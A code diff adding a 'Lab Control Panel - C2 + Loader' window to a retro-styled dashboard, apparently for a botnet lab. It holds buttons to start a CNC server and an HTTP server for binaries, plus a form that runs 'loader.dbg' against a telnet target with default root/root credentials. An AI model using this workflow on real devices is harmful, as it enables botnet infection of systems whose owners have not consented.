@@ -22,6 +22,10 @@
         <span class="pixel-icon icon-log" aria-hidden="true"></span>
         <span>Event.log</span>
       </button>
+      <button type="button" class="desktop-shortcut" data-focus-window="labctl-window">
+        <span class="pixel-icon icon-server" aria-hidden="true"></span>
+        <span>LabCtl.exe</span>
+      </button>
     </aside>
 
     <section class="xp-window app-window" aria-labelledby="app-title">
@@ -192,6 +196,77 @@
             </div>
             <div class="terminal" id="console" aria-live="polite" aria-label="Live CNC and dashboard logs">
               <div class="line sys">[SYS] waiting for dashboard status poll</div>
+            </div>
+          </section>
+
+          <section class="xp-window labctl-window" id="labctl-window" aria-labelledby="labctl-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-server" aria-hidden="true"></span>
+                <span id="labctl-title">Lab Control Panel - C2 + Loader</span>
+              </div>
+              <button type="button" class="titlebar-button" id="btn-lab-refresh">Refresh</button>
+            </div>
+            <div class="window-panel labctl-panel">
+              <div class="labctl-status-row">
+                <div class="status-chip">
+                  <span class="status-led down" id="lab-cnc-led" aria-hidden="true"></span>
+                  <span>CNC :23 <strong id="lab-cnc-text">?</strong></span>
+                </div>
+                <div class="status-chip">
+                  <span class="status-led down" id="lab-agent-led" aria-hidden="true"></span>
+                  <span>Loader agent <strong id="lab-agent-text">?</strong></span>
+                </div>
+                <div class="status-chip">
+                  <span class="status-led down" id="lab-http-led" aria-hidden="true"></span>
+                  <span>HTTP :80 <strong id="lab-http-text">?</strong></span>
+                </div>
+              </div>
+
+              <fieldset class="xp-fieldset">
+                <legend>C2 · 185.10.20.100</legend>
+                <div class="button-grid info-grid" role="group" aria-label="C2 services">
+                  <button type="button" class="xp-button" id="btn-cnc-start">Start CNC</button>
+                  <button type="button" class="xp-button" id="btn-cnc-stop">Stop CNC</button>
+                </div>
+                <p class="labctl-hint">Starts <code>./cnc</code> in screen session <code>cnc</code> on this host.</p>
+              </fieldset>
+
+              <fieldset class="xp-fieldset">
+                <legend>Loader · 185.10.20.200</legend>
+                <div class="button-grid info-grid" role="group" aria-label="Loader HTTP">
+                  <button type="button" class="xp-button" id="btn-http-start">Start HTTP bins</button>
+                  <button type="button" class="xp-button" id="btn-http-stop">Stop HTTP</button>
+                </div>
+                <p class="labctl-hint">Requires lab agent on Loader (<code>:9090</code>). Serves <code>/opt/http-server</code>.</p>
+              </fieldset>
+
+              <fieldset class="xp-fieldset">
+                <legend>Run loader.dbg (manual target)</legend>
+                <form class="lab-loader-form" id="lab-loader-form">
+                  <div class="lab-form-grid">
+                    <label>Target IP
+                      <input class="xp-input" id="loader-ip" type="text" value="125.20.30.113" autocomplete="off" spellcheck="false" required />
+                    </label>
+                    <label>Port
+                      <input class="xp-input" id="loader-port" type="number" value="23" min="1" max="65535" required />
+                    </label>
+                    <label>Username
+                      <input class="xp-input" id="loader-user" type="text" value="root" autocomplete="off" spellcheck="false" required />
+                    </label>
+                    <label>Password
+                      <input class="xp-input" id="loader-pass" type="text" value="root" autocomplete="off" spellcheck="false" required />
+                    </label>
+                  </div>
+                  <button type="submit" class="xp-button run-button" id="btn-loader-run">Run loader.dbg</button>
+                </form>
+                <p class="labctl-hint">Same as <code>echo "IP:23 user:pass" | ./loader.dbg</code> — wait for <code>OK|</code>, do not spam.</p>
+              </fieldset>
+
+              <div class="group-box">
+                <span class="group-label">Loader job log (filtered)</span>
+                <pre class="lab-loader-log" id="lab-loader-log">[lab] press Refresh or Run loader</pre>
+              </div>
             </div>
           </section>
 
